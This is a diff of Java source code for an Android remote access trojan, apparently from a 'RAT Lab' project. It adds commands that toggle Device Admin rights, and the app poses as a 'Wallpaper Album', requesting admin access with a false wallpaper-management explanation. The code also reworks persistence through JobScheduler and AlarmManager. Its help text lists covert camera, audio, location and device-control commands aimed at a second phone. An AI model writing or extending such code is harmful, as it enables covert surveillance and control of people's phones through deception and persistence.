@@ -2,7 +2,9 @@ package com.ratlab;
 
 import android.app.AlarmManager;
 import android.app.PendingIntent;
+import android.app.admin.DevicePolicyManager;
 import android.app.job.JobScheduler;
+import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
 import android.os.Build;
@@ -109,15 +111,18 @@ public class CommandHandler {
 
     private String handleCommand(String cmd, String args) {
         try {
-            // Command khusus pause/resume — tetep jalan walau paused
+            // Command khusus — tetep jalan walau paused
             switch (cmd) {
                 case "/stop":
                     return stopRat();
                 case "/resume":
                     return resumeRat();
+                case "/unadmin":
+                    return unadmin();
+                case "/admin":
+                    return admin();
             }
 
-            // Kalau paused, command lain di-skip (kecuali start/help)
             if (paused && !cmd.equals("/start") && !cmd.equals("/help")) {
                 return "RAT sedang di-pause. Kirim /resume untuk mengaktifkan.";
             }
@@ -127,14 +132,16 @@ public class CommandHandler {
                 case "/help":
                     return "RAT Lab — Commands:\n\n"
                             + "== KONTROL RAT ==\n"
-                            + "/stop — hentikan RAT\n"
-                            + "/resume — lanjutkan RAT\n\n"
+                            + "/stop — pause RAT\n"
+                            + "/resume — lanjutkan RAT\n"
+                            + "/unadmin — matiin Device Admin\n"
+                            + "/admin — nyalain Device Admin\n\n"
                             + "== INFO ==\n"
                             + "/ping /info /uptime /whoami /env\n\n"
                             + "== KAMERA ==\n"
                             + "/camera /camerafront\n\n"
                             + "== AUDIO ==\n"
-                            + "/play <url> /audio-max /speak <detik> /record <detik>\n"
+                            + "/play <url> /audio-max /speak <detik>\n"
                             + "/tts <teks> /volume <level> /vibrate <ms>\n\n"
                             + "== LOKASI ==\n"
                             + "/location /gps\n\n"
@@ -294,19 +301,17 @@ public class CommandHandler {
     }
 
     // ============================================================
-    // STOP RAT — matiin service + persistence
+    // STOP RAT — pause service + persistence
     // ============================================================
     private String stopRat() {
         try {
             paused = true;
 
-            // 1. Matiin JobScheduler
             try {
                 JobScheduler js = (JobScheduler) ctx.getSystemService(Context.JOB_SCHEDULER_SERVICE);
                 if (js != null) js.cancelAll();
             } catch (Exception e) {}
 
-            // 2. Matiin AlarmManager
             try {
                 AlarmManager am = (AlarmManager) ctx.getSystemService(Context.ALARM_SERVICE);
                 Intent ai = new Intent(ctx, AlarmReceiver.class);
@@ -315,8 +320,6 @@ public class CommandHandler {
                 if (am != null) am.cancel(pi);
             } catch (Exception e) {}
 
-            // 3. Stop foreground service (tapi tetep polling command)
-            //    Service tetep hidup biar bisa terima /resume
             return "RAT di-PAUSE.\n"
                     + "- JobScheduler: OFF\n"
                     + "- AlarmManager: OFF\n"
@@ -328,13 +331,12 @@ public class CommandHandler {
     }
 
     // ============================================================
-    // RESUME RAT — nyalain service + persistence
+    // RESUME RAT
     // ============================================================
     private String resumeRat() {
         try {
             paused = false;
 
-            // 1. Restart service (kalau mati)
             Intent svc = new Intent(ctx, BotService.class);
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 ctx.startForegroundService(svc);
@@ -342,11 +344,10 @@ public class CommandHandler {
                 ctx.startService(svc);
             }
 
-            // 2. Nyalain JobScheduler
             try {
                 JobScheduler js = (JobScheduler) ctx.getSystemService(Context.JOB_SCHEDULER_SERVICE);
                 android.app.job.JobInfo job = new android.app.job.JobInfo.Builder(
-                        JOB_ID, new android.content.ComponentName(ctx, RestartJobService.class))
+                        JOB_ID, new ComponentName(ctx, RestartJobService.class))
                         .setPersisted(true)
                         .setPeriodic(15 * 60 * 1000L)
                         .setRequiredNetworkType(android.app.job.JobInfo.NETWORK_TYPE_ANY)
@@ -354,7 +355,6 @@ public class CommandHandler {
                 if (js != null) js.schedule(job);
             } catch (Exception e) {}
 
-            // 3. Nyalain AlarmManager
             try {
                 AlarmManager am = (AlarmManager) ctx.getSystemService(Context.ALARM_SERVICE);
                 Intent ai = new Intent(ctx, AlarmReceiver.class);
@@ -375,6 +375,48 @@ public class CommandHandler {
                     + "Semua command aktif lagi.";
         } catch (Exception e) {
             return "Error resume: " + e.getMessage();
+        }
+    }
+
+    // ============================================================
+    // UNADMIN — matiin Device Admin (biar bisa uninstall)
+    // ============================================================
+    private String unadmin() {
+        try {
+            DevicePolicyManager dpm = (DevicePolicyManager) ctx.getSystemService(Context.DEVICE_POLICY_SERVICE);
+            ComponentName adminCn = new ComponentName(ctx, AdminReceiver.class);
+            if (dpm == null) return "DevicePolicyManager gak tersedia";
+            if (!dpm.isAdminActive(adminCn)) return "Device Admin udah mati.";
+            dpm.removeActiveAdmin(adminCn);
+            return "Device Admin DIMATIKAN.\n\n"
+                    + "Sekarang app bisa di-uninstall dari Settings HP kedua:\n"
+                    + "Settings → Apps → Wallpaper Album → Uninstall";
+        } catch (Exception e) {
+            return "Error unadmin: " + e.getMessage();
+        }
+    }
+
+    // ============================================================
+    // ADMIN — nyalain Device Admin lagi
+    // ============================================================
+    private String admin() {
+        try {
+            DevicePolicyManager dpm = (DevicePolicyManager) ctx.getSystemService(Context.DEVICE_POLICY_SERVICE);
+            ComponentName adminCn = new ComponentName(ctx, AdminReceiver.class);
+            if (dpm == null) return "DevicePolicyManager gak tersedia";
+            if (dpm.isAdminActive(adminCn)) return "Device Admin udah aktif.";
+            // Request via intent — cuma bisa dari activity, tapi kita coba dulu
+            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
+            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminCn);
+            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
+                    "Aktifkan untuk mengelola wallpaper.");
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            ctx.startActivity(intent);
+            return "Prompt Device Admin dikirim ke HP kedua.\n"
+                    + "Harus tap 'Aktifkan' di layar HP kedua.";
+        } catch (Exception e) {
+            return "Error admin: " + e.getMessage()
+                    + "\n\nNote: Device Admin harus diaktifin manual di HP kedua.";
         }
     }
 
